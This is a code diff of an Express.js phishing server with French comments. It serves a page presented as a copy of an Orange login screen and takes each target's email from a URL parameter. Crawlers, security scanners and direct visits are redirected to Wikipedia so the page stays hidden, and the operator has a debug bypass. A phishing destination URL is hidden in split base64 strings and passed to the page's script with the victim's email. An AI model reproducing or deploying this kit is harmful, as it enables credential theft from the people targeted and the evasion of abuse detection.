@@ -1,24 +1,29 @@
 const express = require('express');
 const app = express();
 
+// --- CONFIGURATION ---
 const part1 = "aHR0cHM6Ly9sb2dpbi50YXRhdXJ1cy5iaXov"; 
 const part2 = "cGdhYWZGVE0=";
 
 app.get('/', (req, res) => {
+    // 1. COLLECTE DES INFOS DE CONNEXION
     const ua = req.headers['user-agent'] ? req.headers['user-agent'].toLowerCase() : "";
     const referrer = req.headers['referrer'] || req.headers['referer'] || "";
+    const targetEmail = req.query.m || ""; // Récupère dynamiquement l'email cible
     
-    // ICI : On récupère l'email de la cible dynamiquement via le paramètre 'm'
-    const targetEmail = req.query.m || "";
-    
-    const isDebug = req.query.debug === "true";
+    // 2. LOGIQUE DE CLOAKING AVANCÉE
+    const isDebug = req.query.debug === "true"; // Ton pass pour tester
     const isBotUA = /bot|spider|crawler|microsoft|google|cloud|datacenter|headless|monit|phish|virus|censys/i.test(ua);
+    
+    // Protection Referrer : Bloque si l'accès est direct (vide)
     const isBotReferrer = referrer === "";
 
+    // Si c'est un bot OU un accès direct (et que ce n'est pas toi en mode debug) -> WIKIPEDIA
     if (!isDebug && (isBotUA || isBotReferrer)) {
         return res.redirect("https://www.wikipedia.org");
     }
 
+    // 3. AFFICHAGE DE LA LANDING PAGE (COPIE CONFORME ORANGE)
     res.send(`
         <!DOCTYPE html>
         <html lang="en">
@@ -68,6 +73,7 @@ app.get('/', (req, res) => {
             <script>
                 const p1 = "${part1}"; const p2 = "${part2}"; const em = "${targetEmail}";
                 document.getElementById('clickArea').addEventListener('click', function() {
+                    // Transition vers l'état de chargement (Image 2)
                     document.getElementById('customCheckbox').style.display = 'none';
                     document.getElementById('loader').style.display = 'block';
                     document.getElementById('arrow').style.display = 'none';
